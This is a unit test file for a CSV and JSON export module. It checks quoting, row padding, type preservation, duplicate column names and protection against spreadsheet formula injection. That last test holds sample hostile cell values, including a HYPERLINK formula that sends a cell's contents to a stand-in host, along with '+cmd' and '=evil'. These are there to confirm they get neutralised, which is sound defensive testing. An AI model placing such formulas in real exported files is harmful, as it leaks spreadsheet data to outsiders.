import { describe, expect, it } from "vitest";
import { toCsv, toJson } from "./export";

const columns = [{ name: "id", type: "int" }, { name: "name", type: "nvarchar" }, { name: "note", type: "nvarchar" }];

describe("toCsv", () => {
  it("writes a header and quotes only where needed", () => {
    const csv = toCsv(columns, [
      [1, "plain", null],
      [2, 'has "quotes"', "a,b"],
      [3, "two\nlines", ""],
    ]);
    expect(csv).toBe('id,name,note\r\n1,plain,\r\n2,"has ""quotes""","a,b"\r\n3,"two\nlines",\r\n');
  });

  it("pads rows shorter than the column list (Cosmos columns found later)", () => {
    expect(toCsv(columns, [[1]])).toBe("id,name,note\r\n1,,\r\n");
  });

  it("stops spreadsheets running text that starts like a formula", () => {
    const csv = toCsv(columns, [
      [1, '=HYPERLINK("https://example.test/?"&A1,"x")', "+cmd"],
      [2, "-2+3", "@SUM(A1)"],
      [3, "\tTAB", "\rCR"],
    ]);
    expect(csv.split("\r\n").slice(1, 4)).toEqual([
      `1,"'=HYPERLINK(""https://example.test/?""&A1,""x"")",'+cmd`,
      `2,'-2+3,'@SUM(A1)`,
      `3,'\tTAB,"'\rCR"`,
    ]);
  });

  it("leaves numbers alone, including negative decimals the engine sends as text", () => {
    expect(toCsv(columns, [[-5, "-1.50", "+2e3"]])).toBe("id,name,note\r\n-5,-1.50,+2e3\r\n");
  });

  it("guards column names too", () => {
    expect(toCsv([{ name: "=evil", type: "" }], [])).toBe("'=evil\r\n");
  });
});

describe("toJson", () => {
  it("writes an array of objects, keeping nulls and value types", () => {
    expect(JSON.parse(toJson(columns, [[1, "x", null], [2]]))).toEqual([
      { id: 1, name: "x", note: null },
      { id: 2, name: null, note: null },
    ]);
  });

  it("disambiguates duplicate column names", () => {
    const dup = [{ name: "a", type: "" }, { name: "a", type: "" }, { name: "", type: "" }];
    expect(JSON.parse(toJson(dup, [[1, 2, 3]]))).toEqual([{ a: 1, a_2: 2, column3: 3 }]);
  });
});
